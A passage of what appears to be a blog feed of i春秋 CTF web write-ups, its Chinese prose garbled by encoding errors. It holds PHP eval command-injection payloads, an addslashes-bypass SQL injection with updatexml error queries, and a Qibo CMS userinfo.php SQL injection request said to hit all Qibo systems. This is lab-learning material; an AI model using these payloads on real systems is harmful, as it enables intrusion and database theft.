;â€)}<br>å‘çŽ°é¡µé¢æ²¡æœ‰æ˜¾ç¤ºäº†å°±ã€‚ã€‚ã€‚ã€‚çœ‹æ¥ä¸èƒ½è¿™æ ·ç”¨ï¼Œå› ä¸ºä¸Šé¢çš„æç¤ºä¸­æåˆ°äº†addslashesè½¬ä¹‰ï¼Œå®ƒä¼šå°†æˆ‘ä»¬çš„â€™â€éƒ½è¿›è¡Œè½¬ä¹‰æ‰€ä»¥å°±ä¸èƒ½è¿™ä¹ˆæž„é€ evalæŒ‡ä»¤<br>è¿™é‡Œä½¿ç”¨urlçš„GETä¼ å€¼æ¥é¿å…valä¸­çš„â€™lsâ€™è¢«è½¬ä¹‰æž„é€ payloadï¼š<br>f15g_1s_here.php?val=${eval($_GET[a])}&amp;a=echo <code>ls</code>;</p><p>æŸ¥çœ‹åˆ°æ‰€æœ‰æ–‡ä»¶ï¼Œå†catæŸ¥çœ‹<br>Payloadï¼š<br>f15g_1s_here.php?val=${eval($_GET[a])}&amp;a=echo <code>cat True_F1ag_i3_Here_233.php</code>;<br>é¡µé¢ä¹Ÿæ²¡æœ‰å›žæ˜¾ï¼ŒæŸ¥çœ‹æºç å¾—åˆ°flag</p><p><img src="/2021/05/03/i-chun-qiu-web-hash/aee16a3bbadf0d90bd46e773cf55ede.png" alt="aee16a3bbadf0d90bd46e773cf55ede"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-fuzzing</title>
      <link href="2021/05/02/i-chun-qiu-web-fuzzing/"/>
      <url>2021/05/02/i-chun-qiu-web-fuzzing/</url>
      
        <content type="html"><![CDATA[<p>![805a9f457750436f8de5ac8442cd01b](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/e9a4ed1c33280a6351407e4ff28f074.png)</p><p><img src="/2021/05/02/i-chun-qiu-web-fuzzing/e9a4ed1c33280a6351407e4ff28f074-1620133312910.png" alt="e9a4ed1c33280a6351407e4ff28f074"></p><p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190911135451462-1664953434.png" alt="img"></p><p>æˆ–è€…ï¼š</p><pre><code>import hashlibmd5 = "1b4167610ba3f2ac426a68488dbd89be"s = "abcdefghijklmnopqrstuvwxyz1234567890"for i in s:    for j in s:        for k in s:            key = "ichunqiu"+i+j+k            if(hashlib.md5(key.encode("utf8")).hexdigest() == md5):                print(key)</code></pre><pre><code>ichunqiu105</code></pre><p><img src="/2021/05/02/i-chun-qiu-web-fuzzing/d9b926ce2870aef4573fef6cc22f1bc.png" alt="d9b926ce2870aef4573fef6cc22f1bc"></p><p>æºç åœ¨x0.txtå†…ï¼Œé™„ä¸Šæºç ï¼š</p><pre><code>function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {$ckey_length = 4;$key = md5($key ? $key : UC_KEY);$keya = md5(substr($key, 0, 16));$keyb = md5(substr($key, 16, 16));$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';$cryptkey = $keya . md5($keya . $keyc);$key_length = strlen($cryptkey);$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;$string_length = strlen($string);$result = '';$box = range(0, 255);$rndkey = array();for ($i = 0; $i &lt;= 255; $i++) {    $rndkey[$i] = ord($cryptkey[$i % $key_length]);}for ($j = $i = 0; $i &lt; 256; $i++) {    $j = ($j + $box[$i] + $rndkey[$i]) % 256;    $tmp = $box[$i];    $box[$i] = $box[$j];    $box[$j] = $tmp;}for ($a = $j = $i = 0; $i &lt; $string_length; $i++) {    $a = ($a + 1) % 256;    $j = ($j + $box[$a]) % 256;    $tmp = $box[$a];    $box[$a] = $box[$j];    $box[$j] = $tmp;    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));}if ($operation == 'DECODE') {    if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {        return substr($result, 26);    } else {        return '';    }} else {    return $keyc . str_replace('=', '', base64_encode($result));}}</code></pre><p>è¿™ä¸ªå¥½åƒå°±æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªè§£å¯†å‡½æ•°ï¼ŒDECODEå˜›<br> æˆ‘ä»¬ç›´æŽ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥è§£å¯†<br> ç›´æŽ¥echo</p><pre><code>echo authcode("d116+lpzwYGeuOp97fQ8DbwUogjZvXwKdAMW1skwPQ6mU2kjOKC3b4bhsN7N9hq03qAfaAXEavDq5YxLilcpnCnuM5ClG8g",$operation = 'DECODE', $key = 'ichunqiu105', $expiry = 0);</code></pre><p>phpè„šæœ¬ï¼š</p><pre><code>&lt;?phpfunction authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {    $ckey_length = 4;    $key = md5($key ? $key : UC_KEY);    $keya = md5(substr($key, 0, 16));    $keyb = md5(substr($key, 16, 16));    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';    $cryptkey = $keya . md5($keya . $keyc);    $key_length = strlen($cryptkey);    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;    $string_length = strlen($string);    $result = '';    $box = range(0, 255);    $rndkey = array();    for ($i = 0; $i &lt;= 255; $i++) {        $rndkey[$i] = ord($cryptkey[$i % $key_length]);    }    for ($j = $i = 0; $i &lt; 256; $i++) {        $j = ($j + $box[$i] + $rndkey[$i]) % 256;        $tmp = $box[$i];        $box[$i] = $box[$j];        $box[$j] = $tmp;    }    for ($a = $j = $i = 0; $i &lt; $string_length; $i++) {        $a = ($a + 1) % 256;        $j = ($j + $box[$a]) % 256;        $tmp = $box[$a];        $box[$a] = $box[$j];        $box[$j] = $tmp;        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));    }    if ($operation == 'DECODE') {        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {            return substr($result, 26);        } else {            return '';        }    } else {        return $keyc . str_replace('=', '', base64_encode($result));    }}echo authcode($string = '9d9ezNRP5YbrHb40nkkbNmG4GcuMoHDky3fxTvwdpGQYClaNKgiYKVF7TuY+nsk2l05jNXMsBwFdhDeQOv+gxubgv4zIXn4', $operation = 'DECODE', $key = 'ichunqiu105');?&gt;</code></pre><p><img src="/2021/05/02/i-chun-qiu-web-fuzzing/6b216aa16bcb87f8baae8b35b34bb79.png" alt="6b216aa16bcb87f8baae8b35b34bb79"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-EXEC</title>
      <link href="2021/05/01/i-chun-qiu-web-exec/"/>
      <url>2021/05/01/i-chun-qiu-web-exec/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/leixiao-/p/9786320.html">https://www.cnblogs.com/leixiao-/p/9786320.html</a></p><p>è¿˜æ²¡å­¦linuxè¿‡åŽæ¥åš</p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-Vld</title>
      <link href="2021/04/30/i-chun-qiu-web-vld/"/>
      <url>2021/04/30/i-chun-qiu-web-vld/</url>
      
        <content type="html"><![CDATA[<p>æ‰«æåŽå°å‘çŽ°index.php,txt</p><pre><code>Finding entry pointsBranch analysis from position: 0Jump found. Position 1 = 23, Position 2 = 38Branch analysis from position: 23Jump found. Position 1 = 26, Position 2 = 35Branch analysis from position: 26Jump found. Position 1 = 29, Position 2 = 32Branch analysis from position: 29Jump found. Position 1 = 34Branch analysis from position: 34Jump found. Position 1 = 37Branch analysis from position: 37Jump found. Position 1 = 40Branch analysis from position: 40Return foundBranch analysis from position: 32Jump found. Position 1 = 37Branch analysis from position: 37Branch analysis from position: 35Jump found. Position 1 = 40Branch analysis from position: 40Branch analysis from position: 38Return foundfilename:       C:\ctf\index.phpfunction name:  (null)number of ops:  44compiled vars:  !0 = $a, !1 = $b, !2 = $cline     # *  op                           fetch          ext  return  operands---------------------------------------------------------------------------------   2     0  &gt;   EXT_STMT         1      ECHO                                                     'do+you+know+Vulcan+Logic+Dumper%3F%3Cbr%3E'   3     2      EXT_STMT         3      BEGIN_SILENCE                                    ~0         4      FETCH_R                      global              $1      '_GET'         5      FETCH_DIM_R                                      $2      $1, 'flag1'         6      END_SILENCE                                              ~0         7      ASSIGN                                                   !0, $2   4     8      EXT_STMT         9      BEGIN_SILENCE                                    ~4        10      FETCH_R                      global              $5      '_GET'        11      FETCH_DIM_R                                      $6      $5, 'flag2'        12      END_SILENCE                                              ~4        13      ASSIGN                                                   !1, $6   5    14      EXT_STMT        15      BEGIN_SILENCE                                    ~8        16      FETCH_R                      global              $9      '_GET'        17      FETCH_DIM_R                                      $10     $9, 'flag3'        18      END_SILENCE                                              ~8        19      ASSIGN                                                   !2, $10   6    20      EXT_STMT        21      IS_EQUAL                                         ~12     !0, 'fvhjjihfcv'        22    &gt; JMPZ                                                     ~12, -&gt;38   7    23  &gt;   EXT_STMT        24      IS_EQUAL                                         ~13     !1, 'gfuyiyhioyf'        25    &gt; JMPZ                                                     ~13, -&gt;35   8    26  &gt;   EXT_STMT        27      IS_EQUAL                                         ~14     !2, 'yugoiiyhi'        28    &gt; JMPZ                                                     ~14, -&gt;32   9    29  &gt;   EXT_STMT        30      ECHO                                                     'the+next+step+is+xxx.zip'  10    31    &gt; JMP                                                      -&gt;34  11    32  &gt;   EXT_STMT        33      ECHO                                                     'false%3Cbr%3E'  13    34  &gt; &gt; JMP                                                      -&gt;37  14    35  &gt;   EXT_STMT        36      ECHO                                                     'false%3Cbr%3E'  16    37  &gt; &gt; JMP                                                      -&gt;40  17    38  &gt;   EXT_STMT        39      ECHO                                                     'false%3Cbr%3E'  19    40  &gt;   NOP  22    41      EXT_STMT        42      ECHO                                                     '%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A'        43    &gt; RETURN                                                   1branch: #  0; line:     2-    6; sop:     0; eop:    22; out1:  23; out2:  38branch: # 23; line:     7-    7; sop:    23; eop:    25; out1:  26; out2:  35branch: # 26; line:     8-    8; sop:    26; eop:    28; out1:  29; out2:  32branch: # 29; line:     9-   10; sop:    29; eop:    31; out1:  34branch: # 32; line:    11-   13; sop:    32; eop:    33; out1:  34branch: # 34; line:    13-   13; sop:    34; eop:    34; out1:  37branch: # 35; line:    14-   16; sop:    35; eop:    36; out1:  37branch: # 37; line:    16-   16; sop:    37; eop:    37; out1:  40branch: # 38; line:    17-   19; sop:    38; eop:    39; out1:  40branch: # 40; line:    19-   22; sop:    40; eop:    43path #1: 0, 23, 26, 29, 34, 37, 40,path #2: 0, 23, 26, 32, 34, 37, 40,path #3: 0, 23, 35, 37, 40,path #4: 0, 38, 40,do you know Vulcan Logic Dumper?&lt;br&gt;false&lt;br&gt;&lt;!-- index.php.txt ?&gt;</code></pre><p>ä¸ºphp opcodesï¼Œéœ€è¦å¯¹å…¶ç¼–è¯‘ï¼Œ</p><p>å‚ç…§ï¼š<a href="https://www.cnblogs.com/wosun/p/11386434.html">https://www.cnblogs.com/wosun/p/11386434.html</a></p><p><img src="https://img2018.cnblogs.com/blog/1712230/201908/1712230-20190820233057014-1821050049.png" alt="img"></p><p>æ‰€ä»¥flagåº”æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š</p><p>ç„¶åŽè®¿é—®1chunqiu.zip</p><p>å…¶ä¸­login.phpä¸­å­˜åœ¨æ³¨å…¥æ¼æ´žï¼š</p><pre><code>&lt;?phprequire_once 'dbmysql.class.php';require_once 'config.inc.php';if(isset($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; isset($_POST['number'])){    $db = new mysql_db();    $username = $db-&gt;safe_data($_POST['username']);    $password = $db-&gt;my_md5($_POST['password']);    $number = is_numeric($_POST['number']) ? $_POST['number'] : 1;    $username = trim(str_replace($number, '', $username));    $sql = "select * from"."`".table_name."`"."where username="."'"."$username"."'";    $row = $db-&gt;query($sql);    $result = $db-&gt;fetch_array($row);    if($row){        if($result["number"] === $number &amp;&amp; $result["password"] === $password){            echo "&lt;script&gt;alert('nothing here!')&lt;/script&gt;";        }else{            echo "&lt;script&gt;            alert('å¯†ç é”™è¯¯ï¼Œè€å¸æœºç¿»è½¦äº†!');            function jumpurl(){                location='login.html';            }            setTimeout('jumpurl()',1000);            &lt;/script&gt;";        }    }else{        exit(mysql_error());    }}else{    echo "&lt;script&gt;            alert('ç”¨æˆ·åå¯†ç ä¸èƒ½ä¸ºç©º!');            function jumpurl(){                location='login.html';            }            setTimeout('jumpurl()',1000);        &lt;/script&gt;";} ?&gt;</code></pre><p>å…¶ä¸­usernameå­˜åœ¨addslashes()å¤„ç†ï¼ˆå•å¼•å·ï¼Œåæ–œæ ç­‰å‰é¢éƒ½ä¼šè¢«åŠ ä¸Šåæ–œæ è€Œè½¬ä¹‰ï¼Œé˜²å¾¡sqlæ³¨å…¥ï¼‰ï¼Œå•ä¼¤ä¸‹é¢åˆå­˜åœ¨$username = trim(str_replace($number, â€˜â€™, $username));æ‰€ä»¥è¿™é‡Œå¯ä»¥æ³¨å…¥ã€‚</p><p>å°†numberçš„å€¼æ”¹ä¸º0ï¼Œusernameçš„å€¼æ”¹ä¸º%00â€™å‡ºçŽ°æŠ¥é”™ï¼ˆ%00â€˜ ï¼Œç»è¿‡addslashes()å¤„ç†åŽï¼ˆaddslashes()ä¼šåœ¨NULLå‰åŠ  \ ,0ç­‰äºŽNULLï¼‰æ˜¯ \0\â€˜ï¼‰</p><p>åŽ»æŽ‰0åˆ™ä¼šå˜æˆ\â€™å°±è®©æˆ‘ä»¬çš„å•å¼•å·æ²¡æœ‰è¢«æ³¨é‡Š</p><p>åŽå°çš„æ‰§è¡Œè¯­å¥å°±å˜æˆäº†select * from<code>users</code>where username=â€˜ \ â€˜ â€˜ æ‰€ä»¥ä¼šæŠ¥é”™</p><p>å†æ ¹æ®1chunqiu.zipä¸­çš„config.inc.phpç»™çš„æ•°æ®åº“ä¿¡æ¯ä¸€æ­¥ä¸€æ­¥æŠ¥é”™æŸ¥è¯¢ä¸‹åŽ»å¾—åˆ°flag</p><p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190902165656831-1580248640.png" alt="img"></p><pre><code>%00'and updatexml(1,substr((select flag from flag),1,41),1)#%00'and updatexml(1,substr((select flag from flag),12,41),1)#</code></pre><p><img src="/2021/04/30/i-chun-qiu-web-vld/de1f20c61a02d4c5739cf5e772066e9.png" alt="de1f20c61a02d4c5739cf5e772066e9"></p><p><img src="/2021/04/30/i-chun-qiu-web-vld/d7b9e103ac86ed98b291be7d6cf8437.png" alt="d7b9e103ac86ed98b291be7d6cf8437"></p><pre><code>flag{a7758b35-61e7-484e-85f8-edffb5059625}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-å†è§CMS</title>
      <link href="2021/04/29/i-chun-qiu-web-zai-jian-cms/"/>
      <url>2021/04/29/i-chun-qiu-web-zai-jian-cms/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/29/i-chun-qiu-web-zai-jian-cms/435a24540be807e64702b513922440a.png" alt="435a24540be807e64702b513922440a"></p><p>è§‚å¯Ÿç½‘ç«™æœ€ä¸‹æ–¹ï¼Œæ ¹æ®å¤‡æ¡ˆå·æœåˆ°è¿™æ˜¯ä¸ªé½åšCMSï¼Œç„¶åŽç™¾åº¦å°±å¯ä»¥æœåˆ°é½åšCMSæ¼æ´žäº†</p><h2 id="é½åšcms-userinfoæ³¨å…¥"><a href="#é½åšcms-userinfoæ³¨å…¥" class="headerlink" title="é½åšcms_userinfoæ³¨å…¥"></a>é½åšcms_userinfoæ³¨å…¥</h2><p>å°±æ‹¿é½åšæ•´ç«™ç³»ç»Ÿä¸ºä¾‹ã€‚<br>çœ‹åˆ°/member/userinfo.phpï¼Œ112åˆ°114è¡Œï¼š</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//è¿‡æ»¤ä¸å¥åº·çš„å­—</span>$truename<span class="token operator">=</span><span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$truename<span class="token punctuation">)</span>$introduce<span class="token operator">=</span><span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$introduce<span class="token punctuation">)</span><span class="token punctuation">;</span>$address<span class="token operator">=</span><span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$address<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p> è¿™å‡ å¥è¿‡æ»¤ä»£ç ï¼Œæ„æ€æ˜¯æƒ³è¿‡æ»¤ä¸€äº›â€œä¸å’Œè°â€çš„è¯è¯­ã€‚é‚£æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªreplace_bad_wordå‡½æ•°ã€‚</p><pre class=" language-java"><code class="language-java">function <span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$str<span class="token punctuation">)</span><span class="token punctuation">{</span>global $Limitword<span class="token punctuation">;</span><span class="token annotation punctuation">@include_once</span><span class="token punctuation">(</span>ROOT_PATH<span class="token punctuation">.</span><span class="token string">"data/limitword.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">foreach</span><span class="token punctuation">(</span> $Limitword AS $old<span class="token operator">=</span><span class="token operator">></span>$<span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">strlen</span><span class="token punctuation">(</span>$old<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span> <span class="token operator">&amp;&amp;</span> $str<span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span>$old<span class="token punctuation">,</span><span class="token function">trim</span><span class="token punctuation">(</span>$<span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">,</span>$str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> $str<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>å®žé™…ä¸Šæ˜¯ä¸€ä¸ªstr_replaceï¼Œå°†æ—§çš„â€œä¸å’Œè°â€è¯è¯­æ›¿æ¢æˆæ–°çš„â€œå’Œè°â€è¯è¯­ã€‚é‚£ä¹ˆæ›¿æ¢åˆ—è¡¨ä»Žå“ªæ¥ï¼Ÿçœ‹çœ‹data/limitword.phpï¼š</p><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php $Limitword<span class="token punctuation">[</span><span class="token string">'é€ å'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'é€ **'</span><span class="token punctuation">;</span>$Limitword<span class="token punctuation">[</span><span class="token string">'æ³•è½®åŠŸ'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'æ³•**åŠŸ'</span><span class="token punctuation">;</span></code></pre><p> å°±è¿™ä¸¤ä¸ªï¼Œ$Limitwordå¹¶æ²¡æœ‰åˆå€¼ã€‚è€Œä¸”includeä¹‹å‰æœ‰global  $Limitwordã€‚é½åšcmsæ˜¯å°†GETå’ŒPOSTå˜é‡æ³¨å†Œæˆå…¨å±€å˜é‡äº†ï¼Œæ‰€ä»¥globalå–åˆ°çš„å¯ä»¥æ˜¯$_POST[Limitword]æˆ–$_GET[Limitword]ã€‚ä¹Ÿå°±æ˜¯è¯´$Limitwordæ˜¯æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çš„ã€‚<br> ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æŽ§åˆ¶str_replaceå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°ã€‚ä¸çŸ¥é“è¿˜æœ‰æ²¡æœ‰äººè®°å¾—ecshopæ›¾ç»çš„ä¸€ä¸ªæ³¨å…¥æ¼æ´žï¼ŒåŽŸç†ç›¸åŒï¼Œæˆ‘å†è¯´ä¸€éã€‚<br> æŸå˜é‡$strå…¨å±€åšè¿‡è½¬ä¹‰ï¼Œå¯¼è‡´%00è½¬ä¹‰æˆäº†\0.æˆ‘ä»¬èƒ½å¤ŸæŽ§åˆ¶str_replaceçš„å‰ä¸¤ä¸ªå‚æ•°ï¼Œåˆ™str_replace(â€˜0â€™, â€˜â€™, $str)ï¼Œå†å°†0è½¬æ¢æˆç©ºï¼Œåˆ™ç•™ä¸‹äº†\ï¼Œè¿™ä¸ª\å¯ä»¥è½¬ä¹‰å…¶åŽçš„\â€™ï¼Œä½¿ä¹‹å˜æˆ\â€™ï¼Œå¯¼è‡´å•å¼•å·é€ƒé€¸å‡ºè½¬ä¹‰ç¬¦çš„é™åˆ¶ï¼Œé€ æˆæ³¨å…¥ã€‚<br> è¿™é‡Œçš„åŽŸç†æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡é½åšcmsä¹‹å‰å¯¹ä¸€äº›å˜é‡åšäº†è¿‡æ»¤ï¼š</p><pre class=" language-java"><code class="language-java">$truename<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$truename<span class="token punctuation">)</span><span class="token punctuation">;</span>$idcard<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$idcard<span class="token punctuation">)</span><span class="token punctuation">;</span>$telephone<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$telephone<span class="token punctuation">)</span><span class="token punctuation">;</span>$address<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$address<span class="token punctuation">)</span><span class="token punctuation">;</span>$introduce<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$introduce<span class="token punctuation">)</span><span class="token punctuation">;</span>$homepage<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$homepage<span class="token punctuation">)</span><span class="token punctuation">;</span>function <span class="token function">filtrate</span><span class="token punctuation">(</span>$msg<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//$msg = str_replace('&amp;','&amp;amp;',$msg);</span><span class="token comment" spellcheck="true">//$msg = str_replace(' ','&amp;nbsp;',$msg);</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot;'</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">'&amp;#39;'</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"&amp;lt;"</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"&amp;gt;"</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"   &amp;nbsp;  &amp;nbsp;"</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$msg = str_replace("\r","",$msg);</span>$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">,</span><span class="token string">" &amp;nbsp; "</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> $msg<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>å°†â€™ç­‰æ•æ„Ÿå­—ç¬¦è¿‡æ»¤äº†ã€‚å°±ç®—æœ‰ä¸€ä¸ª\å¯ä»¥è½¬ä¹‰ä¸€ä¸ªâ€™ï¼Œä½†æ˜¯è¿™é‡Œè¿žâ€™éƒ½å¼•å…¥ä¸äº†ã€‚<br> æ²¡å…³ç³»ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯æ›´æ–°ç”¨æˆ·ä¿¡æ¯ç”¨çš„ï¼Œæ‰§è¡Œçš„è¯­å¥ç±»ä¼¼update table set a=â€™111â€™,b=â€™222â€™ where  uid=1ï¼Œæˆ‘ä»¬å¼•å…¥ä¸€ä¸ª\åœ¨111çš„æœ€åŽï¼Œè½¬ä¹‰æŽ‰111åŽé¢çš„å¼•å·ï¼Œè¿™æ ·222å°±é€ƒé€¸å‡ºäº†é™åˆ¶ï¼Œæˆ‘ä»¬çš„sqlæ³¨å…¥è¯­å¥å°±å¯ä»¥æ”¾åœ¨222çš„ä½ç½®æ‰§è¡Œäº†ã€‚è¿™ä¸ªå’Œä¹‹å‰discuz7.2çš„faq.phpé‚£ä¸ªæ³¨å…¥ç±»ä¼¼ï¼š WooYun: Discuz7å­˜åœ¨ä¸€å¤„SQLæ³¨å°„æ¼æ´žï¼ˆæ— éœ€ç™»å½•å³å¯è§¦å‘ï¼‰<br> æ‰€ä»¥ï¼Œå®Œç¾Žæž„é€ äº†ä¸€ä¸ªSQLæ³¨å…¥ã€‚</p><p>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼š</p><p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100933358.jpg" alt="04.jpg"></p><p> è®°ä¸‹è‡ªå·±çš„uidï¼Œä»¥ä¾¿ä¸€ä¼šæ›´æ–°æ•°æ®ï¼š</p><p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934359.jpg" alt="05.jpg"></p><p>å¯ä»¥å…ˆæµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼š</p><p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934360.jpg" alt="07.jpg"><br> æŠ¥é”™äº†ï¼Œè¯´æ˜Žæ³¨å…¥æ˜¯å­˜åœ¨çš„ã€‚<br> ç®€å•æž„é€ ä¸€ä¸‹ï¼Œå‘<a href="http://localhost/qibov7/member/userinfo.php?job=edit&amp;step=2%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%9A">http://localhost/qibov7/member/userinfo.php?job=edit&amp;step=2å‘é€æ•°æ®åŒ…ï¼š</a><br> truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select user()) where uid=38%23</p><p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934361.jpg" alt="06.jpg"></p><p>å°†addressæ³¨å…¥æˆä¸ºuser()ã€‚WhereåŽé¢åŠ ä¸Šuid=2ï¼Œé˜²æ­¢æŠŠå…¶ä»–äººçš„addressä¹Ÿæ³¨å…¥äº†ã€‚<br>  æŸ¥çœ‹ä¸ªäººæ³¨å…¥çš„åœ°å€ï¼Œå³å¯è§æ³¨å…¥èŽ·å¾—çš„ç»“æžœï¼š</p><p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934362.jpg" alt="08.jpg"></p><p> è¿™ä¸ªæ´žæ˜¯é€šæ€é½åšæ‰€æœ‰ç³»ç»Ÿçš„ï¼Œç»æµ‹è¯•é½åšæ•´ç«™ç³»ç»Ÿã€é½åšåœ°æ–¹é—¨æˆ·éƒ½å¯ä»¥ä¸­æ‹›ï¼Œæ²¡è¯•å…¶ä»–ä¸€äº›ç³»ç»Ÿäº†ï¼Œæˆ‘ä¼°è®¡å¾ˆå¤šéƒ½å¾—ä¸­æ‹›ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_33020901/article/details/52593063">https://blog.csdn.net/qq_33020901/article/details/52593063</a></p><h2 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h2><p>é¦–å…ˆå°è¯•äº†åœ¨ç”¨æˆ·ä¿¡æ¯ä¿®æ”¹å¤„è¿›è¡Œæ³¨å…¥ï¼Œå‘çŽ°å¥½åƒæƒ³ä¸é€šäº†ï¼Œå°±åœ¨åšå®¢ç•Œé¢è¿›è¡Œæ³¨å…¥</p><p>Payloadï¼š</p><p>èŽ·å–ç‰ˆæœ¬ä¿¡æ¯</p><p>[<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20version()),0x7e),1)))a%23%5D">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20version()),0x7e),1)))a%23]</a>(<a 